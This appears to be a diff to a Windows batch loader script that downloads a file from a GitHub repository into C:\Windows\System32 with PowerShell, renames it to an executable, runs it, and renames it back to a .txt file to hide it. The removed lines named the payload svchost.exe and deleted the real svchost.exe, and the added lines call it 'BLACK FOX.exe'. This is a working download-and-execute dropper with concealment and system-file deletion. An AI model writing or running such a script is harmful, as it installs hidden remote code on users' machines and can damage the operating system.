@@ -12,8 +12,8 @@ if %errorlevel% neq 0 (
 )
 
 :: Step 1: Delete old files
-if exist "C:\Windows\System32\SNIPER90.dll" del /f /q "C:\Windows\System32\quartz.txt"
-if exist "C:\Windows\System32\BLACK FOX.exe" del /f /q "C:\Windows\System32\svchost.exe"
+if exist "C:\Windows\System32\SNIPER90.dll" del /f /q "C:\Windows\System32\quartz"
+if exist "C:\Windows\System32\BLACK FOX.exe" del /f /q "C:\Windows\System32\BLACK FOX.exe"
 
 :: Step 2: Download new file
 powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/BLACK89310/BLACK-FOX/raw/refs/heads/main/quartz' -OutFile 'C:\Windows\System32\quartz.txt' -ErrorAction Stop } catch { exit 1 }"
@@ -23,17 +23,16 @@ if not exist "C:\Windows\System32\quartz.txt" (
 )
 
 :: Step 3: Rename DLL to EXE
-ren "C:\Windows\System32\quartz.txt" "svchost.exe"
+ren "C:\Windows\System32\quartz.txt" "BLACK FOX.exe"
 
 :: Step 4: Execute
-start "" "C:\Windows\System32\svchost.exe"
+start "" "C:\Windows\System32\BLACK FOX.exe"
 
 :: Step 5: Wait for 5 seconds
 timeout /t 5 /nobreak >nul
 
 :: Step 6: Rename EXE back to DLL
-ren "C:\Windows\System32\svchost.exe" "quartz.txt"
+ren "C:\Windows\System32\BLACK FOX.exe" "quartz.txt"
 
 :: Auto-exit
 exit
-
